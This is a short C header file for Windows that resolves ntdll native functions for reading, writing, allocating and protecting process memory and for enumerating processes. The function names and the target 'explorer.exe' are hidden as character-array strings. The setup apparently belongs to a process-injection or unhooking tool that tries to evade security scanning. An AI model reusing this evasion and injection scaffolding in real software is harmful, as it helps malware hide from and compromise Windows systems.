#pragma once

#include <Windows.h>
#include "helpers.h"
#include "PEstructs.h"

WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
char txt[] = { '.','t','e','x','t', 0 };
WCHAR procName[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };

HMODULE  dllModule = hlpGetModuleHandle(masterDLL);

char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(dllModule, protect);

char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtWriteVirtualMemory pWriteMem = (myNtWriteVirtualMemory)hlpGetProcAddress(dllModule, write);

char qu3rySyst3m[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
myNtQuerySystemInformation penumProc = (myNtQuerySystemInformation)hlpGetProcAddress(dllModule, qu3rySyst3m);

char alloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddress(dllModule, alloc);

char ntRead[] = { 'N','t','R','e','a','d','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtReadVirtualMemory pReadMem = (myNtReadVirtualMemory)hlpGetProcAddress(dllModule, ntRead);
